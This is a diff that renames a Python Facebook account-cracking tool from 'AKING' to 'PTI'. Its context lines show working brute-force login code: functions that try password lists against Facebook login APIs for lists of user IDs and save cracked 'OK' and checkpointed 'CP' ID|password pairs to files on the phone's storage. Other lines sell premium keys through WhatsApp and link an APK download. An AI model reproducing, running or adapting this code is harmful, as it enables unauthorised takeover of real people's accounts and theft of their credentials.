@@ -14,7 +14,7 @@ try:
 except ModuleNotFoundError:
         print('\n Installing missing modules ...')
         os.system('pip install requests futures==2 > /dev/null')
-        os.system('python AKING.py')
+        os.system('python PTI.py')
 except:pass
         
 fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
@@ -197,7 +197,7 @@ def public():
                 print(' \033[1;32mTotal OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input('\033[1;31m Press enter to back ')
-                os.system('python AKING.py')
+                os.system('python PTI.py')
         except requests.exceptions.ConnectionError:
                 exit(f' No internet connection')
         except (KeyError,IOError):
@@ -270,7 +270,7 @@ def menu():
                                 print(' Total \033[1;32mOK/\033[1;31mCP: '+str(len(oks))+'/'+str(len(cps)))
                                 linex()
                                 input(' \033[1;31mPress enter to back ')
-                                os.system('python AKING.py')
+                                os.system('python PTI.py')
                         #elif xd in ['2','02']:
                                 import dump
                                 dump.Main()
@@ -297,7 +297,7 @@ def menu():
                                 wx=('Dsj9JMWoixk4Qsje0Ng3nA')
                                 os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
                         elif xd in ['7','07']:
-                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/AKING_VPN1.0.apk/file');menu()
+                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/PTI_VPN1.0.apk/file');menu()
                         elif xd in ['8','08']:
                                 os.system('xdg-open https://www.facebook.com/100084680097792/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
                         elif xd in ['0','00']:
@@ -321,9 +321,9 @@ def menu():
                         url_wa = "https://api.whatsapp.com/send?phone=+923150665740&text="
                         name = input(" Enter your Name : ")
                         linex()
-                        tks = ("Hi Aking Sir, I Need To Buy Your Paid AKING PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
+                        tks = ("Hi Aking Sir, I Need To Buy Your Paid PTIPRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                         subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
-                        print(' Run :  python AKING.py')
+                        print(' Run :  python PTI.py')
                         exit()
         except ValueError:
                 exit()
@@ -359,7 +359,7 @@ def pak():
                 print(' \033[1;32mTotal OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' \033[1;31mPress enter to back ')
-                os.system('python AKING.py')
+                os.system('python PTI.py')
 def bd():
                 user=[]
                 clear()
@@ -389,7 +389,7 @@ def bd():
                 print(' \033[1;32mTotal OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' \033[1;31mPress enter to back ')
-                os.system('python AKING.py')
+                os.system('python PTI.py')
 def gmail():
                 os.system('rm -rf .re.txt')
                 clear()
@@ -444,7 +444,7 @@ def gmail():
                 print(' \033[1;32mTotal OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' \033[1;31mPress enter to back ')
-                os.system('python AKING.py')
+                os.system('python PTI.py')
 def Afg():
                 user=[]
                 clear()
@@ -474,10 +474,10 @@ def Afg():
                 print(' \033[1;32mTotal OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' \033[1;31mPress enter to back ')
-                os.system('python AKING.py')
+                os.system('python PTI.py')
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;37m [AKING-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [PTI-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -498,14 +498,14 @@ def ffb(ids,names,passlist):
                         if "c_user" in Aking:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print('\r\r\033[1;32m [AKING-OK] %s | %s'%(ids,pas))
-                                open('/sdcard/AKING-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print('\r\r\033[1;32m [PTI-OK] %s | %s'%(ids,pas))
+                                open('/sdcard/PTI-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Aking:
                                 if 'y' in pcp:
-                                        print('\r\r\x1b[38;5;208m [AKING-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/AKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;208m [PTI-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/PTI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -519,7 +519,7 @@ xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT
 def api(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [AKING-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [PTI-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -569,14 +569,14 @@ def api(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m [AKING-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/AKING-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [PTI-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/PTI-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [AKING-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/AKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;208m [PTI-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/PTI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                 else:
@@ -589,7 +589,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [AKING-M3] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [PTI-M3] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -639,18 +639,18 @@ def api1(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m [AKING-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/AKING-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [PTI-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/PTI-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [AKING-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/AKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;208m [PTI-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/PTI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open('/sdcard/AKING-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/PTI-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
@@ -662,7 +662,7 @@ def api1(ids,names,passlist):
 def rndm(ids,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [PTI-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         for pas in passlist:
                                 application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                 application_version_code=str(random.randint(000000000,999999999))
@@ -708,16 +708,16 @@ def rndm(ids,passlist):
                                 if 'session_key' in q:
                                         uid=str(q['uid'])
                                         try:
-                                                okk=open('/sdcard/AKING-OK.txt','r').read()
+                                                okk=open('/sdcard/PTI-OK.txt','r').read()
                                                 if uid in okk:pass
                                                 else:
-                                                        print('\r\r\033[1;32m [AKING-OK] '+uid+' | '+pas+'\033[1;97m')
-                                                        open('/sdcard/AKING-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                        print('\r\r\033[1;32m [PTI-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                        open('/sdcard/PTI-OK.txt','a').write(uid+'|'+pas+'\n')
                                                         oks.append(ids)
                                                         break
                                         except:
-                                                print('\r\r\033[1;32m [AKING-OK] '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/AKING-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                print('\r\r\033[1;32m [PTI-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/PTI-OK.txt','a').write(uid+'|'+pas+'\n')
                                                 oks.append(ids)
                                                 break
                                 else:
